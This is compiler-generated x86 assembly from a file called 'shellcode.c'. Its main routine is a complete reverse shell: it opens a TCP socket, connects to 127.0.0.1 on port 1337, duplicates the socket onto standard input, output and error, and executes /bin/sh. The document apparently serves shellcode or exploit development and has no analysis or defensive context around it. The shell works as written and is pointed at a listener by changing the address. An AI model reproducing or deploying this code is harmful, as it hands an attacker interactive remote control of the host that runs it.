	.file	"shellcode.c"
	.section	.rodata
.LC0:
	.string	"127.0.0.1"
.LC1:
	.string	"/bin/sh"
	.text
	.globl	main
	.type	main, @function
main:
.LFB2:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	movl	%esp, %ebp
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
	subl	$52, %esp
	movl	%ecx, %eax
	movl	4(%eax), %eax
	movl	%eax, -44(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -12(%ebp)
	xorl	%eax, %eax
	movl	$0, -28(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -16(%ebp)
	subl	$4, %esp
	pushl	$0
	pushl	$1
	pushl	$2
	call	socket
	addl	$16, %esp
	movl	%eax, -36(%ebp)
	movw	$2, -28(%ebp)
	subl	$12, %esp
	pushl	$1337
	call	htons
	addl	$16, %esp
	movw	%ax, -26(%ebp)
	subl	$12, %esp
	pushl	$.LC0
	call	inet_addr
	addl	$16, %esp
	movl	%eax, -24(%ebp)
	subl	$4, %esp
	pushl	$16
	leal	-28(%ebp), %eax
	pushl	%eax
	pushl	-36(%ebp)
	call	connect
	addl	$16, %esp
	subl	$8, %esp
	pushl	$0
	pushl	-36(%ebp)
	call	dup2
	addl	$16, %esp
	subl	$8, %esp
	pushl	$1
	pushl	-36(%ebp)
	call	dup2
	addl	$16, %esp
	subl	$8, %esp
	pushl	$2
	pushl	-36(%ebp)
	call	dup2
	addl	$16, %esp
	movl	$0, -32(%ebp)
	subl	$8, %esp
	leal	-32(%ebp), %eax
	pushl	%eax
	pushl	$.LC1
	call	execv
	addl	$16, %esp
	movl	$0, %eax
	movl	-12(%ebp), %edx
	xorl	%gs:20, %edx
	je	.L3
	call	__stack_chk_fail
.L3:
	movl	-4(%ebp), %ecx
	.cfi_def_cfa 1, 0
	leave
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE2:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
